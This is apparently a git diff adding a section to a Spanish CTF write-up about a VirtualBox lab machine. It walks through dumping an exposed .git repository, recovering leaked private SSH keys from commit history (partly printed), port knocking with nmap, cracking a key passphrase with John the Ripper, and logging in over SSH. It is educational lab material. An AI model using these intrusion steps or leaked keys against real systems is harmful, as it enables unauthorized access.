@@ -79,5 +79,178 @@ MAC Address: 08:00:27:18:06:C1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
 ...
 ```
 
-El segundo escaneo nos reporta que existe un directorio `.git/` y que el servidor es un `nginx 1.22.1`. Si accedemos desde el navegador.
+El segundo escaneo nos reporta que existe un directorio `.git/` y que el servidor es un `nginx 1.22.1`. Si accedemos desde el navegador nos muestra una página de bienvenida del servidor.
 
+![paginaInicio](https://github.com/user-attachments/assets/82d70e08-40aa-4cae-9ddd-8dbb4dd08fb9)
+
+## Vulnerabilidades
+
+Si accedemos a la ruta `./path` podremos ver los archivos de un repositorio de github. Vamos a descargarlo en nuestra máquina atacante para ver que cambios se han hecho. Para ello podemos usar el comando `wget` aunque decidí investigar que herramientas habían hecho otras personas y descubrí una herramienta llamada [git-dumper](https://github.com/arthaud/git-dumper), que intenta obtener todos los recursos que encuentre de un directorio `/.git` expuesto.
+
+```bash
+git-dumper http://10.0.2.10/.git <output-directory>
+```
+
+Después de ejecutar la herramienta ya tenía lo mismo que podiamos acceder en la página web pero esta vez podía ejecutar comandos con `git`. Como era un repositorio o parte de un repositorio, miré cuales habían sido los últimos commits que se habían realizado con `git log`.
+
+![commits](https://github.com/user-attachments/assets/d34491b8-99de-4dd3-8b20-e4ebde293b28)
+
+Bien, había cinco commits, a continuación use `git log -p` para ver que cambios se habían hecho en cada uno de los commits y encontré varias cosas interesantes. Por un lado teniamos una clave privada de OpenSSH.
+
+```
+commit 2b5a7479c36d425981b95982c37b10a34ce11aca (HEAD -> master)
+Author: charlie <charlie@hit.nyx>
+Date:   Mon Feb 3 23:33:01 2025 +0100
+
+    Commit #5
+
+diff --git a/id_rsa b/id_rsa
+deleted file mode 100644
+index 7d19f82..0000000
+--- a/id_rsa
++++ /dev/null
+@@ -1,38 +0,0 @@
+------BEGIN OPENSSH PRIVATE KEY-----
+-b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+-NhAAAAAwEAAQAAAYEAwj6WBGX4oplwOjEP2GaY8G+DeRIRHwUiON5dae888c3YXaGez5xC
+-ZlW1pKi3t2DFL+oAZP+M3P/9HNutK6mSf0lgaLcXyOmQMjXdj67knRpg7CXOTLEO9MZkqi
+-IXYnqTEPA2QwrNrCEBk5e02xeaD7p7o3myqSWgyyo1zIrHsCIgLwjG4inhP5zn1r94UsW8
+-nsyfNPG4hqbwS6or+E368zYjrwcTyLafXUKOEPj/8VjRl/hIYPXLRw38h/YR65C7qO3iPO
+-lZRjs5PRM3vVV8PsiBwI+Zo0lLVChI0EyJ9xmP+/4Ps/Y0KUHJYXhbeUqTF3QnmWqKGpEK
+-LUal47hZb5FTCBFUCYY51VDzXziZZ5yeSsCPYVHIbj70kcNSVp9gwaAa7Bit2sWl7mIJPM
+-LT3NB4TS5Ptr+iRL15lHCNAtvGhFUsPtEbihL1CvOxiaN9wZ3qRUknUjTIG9lZ+tZZTepT
+-7TGHDzm286ozj4ciKV3jJpQ4BukFitnN03wH62n5AAAFgNYk2vjWJNr4AAAAB3NzaC1yc2
+-EAAAGBAMI+lgRl+KKZcDoxD9hmmPBvg3kSER8FIjjeXWnvPPHN2F2hns+cQmZVtaSot7dg
+-xS/qAGT/jNz//RzbrSupkn9JYGi3F8jpkDI13Y+u5J0aYOwlzkyxDvTGZKoiF2J6kxDwNk
+-MKzawhAZOXtNsXmg+6e6N5sqkloMsqNcyKx7AiIC8IxuIp4T+c59a/eFLFvJ7MnzTxuIam
+-8EuqK/hN+vM2I68HE8i2n11CjhD4//FY0Zf4SGD1y0cN/If2EeuQu6jt4jzpWUY7OT0TN7
+-1VfD7IgcCPmaNJS1QoSNBMifcZj/v+D7P2NClByWF4W3lKkxd0J5lqihqRCi1GpeO4WW+R
+-UwgRVAmGOdVQ8184mWecnkrAj2FRyG4+9JHDUlafYMGgGuwYrdrFpe5iCTzC09zQeE0uT7
+...
+```
+
+Por otro lado teníamos cambios realizados en un archivo llamado knockd.conf, buscando en internet obtenemos que este archivo se usa como `daemon` para ejecutar una herramienta llamada `knock` que se suele usar para realizar port knocking a los puertos de tu máquina y así securizar algo más tu entorno.
+
+```
+--- a/knockd.conf
++++ /dev/null
+@@ -1,20 +0,0 @@
+-[options]
+-       UseSyslog
+-
+-[openSSH]
+-       sequence    = 7000,8000,9000
+-       seq_timeout = 5
+-       command     = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+-       tcpflags    = syn
+-
+-[closeSSH]
+-       sequence    = 9000,8000,7000
+-       seq_timeout = 5
+-       command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+-       tcpflags    = syn
+-
+-[openHTTPS]
+-       sequence    = 12345,54321,24680,13579
+-       seq_timeout = 5
+-       command     = /usr/local/sbin/knock_add -i -c INPUT -p tcp -d 443 -f %IP%
+-       tcpflags    = syn
+```
+
+En otros commits encontramos otra clave privada pero en este caso es una clave RSA y esta cifrada.
+
+```
+------BEGIN RSA PRIVATE KEY-----
+-Proc-Type: 4,ENCRYPTED
+-DEK-Info: DES-EDE3-CBC,3E2B3558346EF63A
+-
+-6ba1VKUz/cNss0/xw7FkmsfiG15ExhqArUxI7WCfiFKNaeuSdUNETexm38BmeC/b
+-kmKErTAVzIpCtzCxXYEO8wOOyJRJEZGHNqtoq6bgrxcZaJfzONc1EM6aEIfQS+Ks
+-zloh5Ye8FygCkU2bCSYnaLwyHuGUcJ72Oa+8jYJtsvr1Gd+z0CWJapRodsYnlvep
+-5EGx+jaYDkOG3VEtvjfPvA+pezHPifDsLr03JNuGb4awvpTGoRqXjXSYSfKOKimy
+-Jpip4JVxit3T9aaOu1wF5UIExRtTG9lj38Mb1H2zXENcONIX5nAPoacvvZtCp9iz
+-20qafBdLgnvZF0sy9GEvjouXPNeAk/c19qTvAu6lSsQq0NliIcozN8tLyvNHUjPv
+-s/BptewE2NK0YvkNNCNhTilVMPaaojhf8zIVqNeH3L99GBUjigNdd2kqYzX4CjG/
+...
+```
+Por último, algo más abajo encontramos otra configuración en `knockd.conf` que habilita el servicio ssh.
+
+```
+...
+-       sequence    = 65535,8888,54111
+-       seq_timeout = 1
+-       command     = /usr/sbin/service ssh start
+...
+```
+
+Recapitulando, tenemos dos claves privadas que puede que nos den acceso al servidor ssh, pero en el escaneo el puerto ssh no aparecía abierto. Además sabemos que en el sistema se esta ejecutando un programa en daemon que esta esperando a que se cumplan las condiciones para ejecutar los comandos que están más arriba. Por lo tanto, primero pensé en intentar abrir el puerto ssh con `nmap` pero no funcionó. Cuando vi la otra regla que abre el servicio ssh volví a ejecutar nmap con el siguiente comando.
+
+```bash
+nmap -sS -r -p65535,8888,54111 10.0.2.10
+```
+
+Seguidamente volví a probar a abrir el servicio OpenSSH
+ ```
+[openSSH]
+-       sequence    = 7000,8000,9000
+-       seq_timeout = 5
+-       command     = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+-       tcpflags    = syn
+```
+
+```bash
+nmap -sS -r -p7000,8000,9000 10.0.2.10
+```
+
+Y obtuve el siguiente resultado de nmap.
+
+```
+...
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
+| ssh-hostkey: 
+|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
+|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
+80/tcp open  http    nginx 1.22.1
+|_http-server-header: nginx/1.22.1
+|_http-title: Site doesn't have a title (text/html).
+| http-git: 
+|   10.0.2.10:80/.git/
+|     Git repository found!
+|     Repository description: Unnamed repository; edit this file 'description' to name the...
+|_    Last commit message: Commit #5 
+MAC Address: 08:00:27:18:06:C1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+...
+```
+
+Como ya tenemos el puerto 22 abierto podemos probar algunas de las dos claves privadas para ver si podemos acceder por ssh a la máquina víctima. La clave privada de ssh nos pide una contraseña que no tenemos y no podemos crackear, pero la clave rsa privada si podemos convertirla a un hash con la herramienta de `ssh2john` que viene instalada en kali, con el siguiente comando:
+
+```bash
+ssh2john file_with_rsa_private_key > hash_output_file
+```
+
+Este hash lo vamos a intentar romper con la herramienta `John the Ripper` que ya viene instalada en kali de la siguiente forma:
+
+```bash
+john hash -wordlist=rockyou.txt
+```
+
+(Nota: la ruta de la wordlist no es la que pone en el comando, para que john funcione debeis poner la ruta absoluta donde esta la wordlist, ante cualquier duda revisar los manuales con `man john`)
+
+Después de poco tiempo john encuentra la contraseña la cual no voy a mostrar porque el objetivo de este write-up no es resolver el ctf sino entender y aprender sobre las metodologías de ataque en esta máquina. Con la contraseña y la clave privada ya podemos acceder a la máquina como el usuario charlie por `ssh` de la siguiente forma:
+
+```bash
+ssh -i id_rsa charlie@10.0.2.10
+```
+
+Donde:
+
+- `id_rsa` es el archivo que contiene la clave privada
+- `-i` es la flag donde indicamos a ssh que queremos usar esta clave para acceder.
+
+![sshAccess](https://github.com/user-attachments/assets/d1165c70-1d7e-442d-ba79-504d87219ff1)
+
+Dentro de la máquina ya podemos pasar a la fase de escalada de privilegios.
+
+## Escalada de privilegios
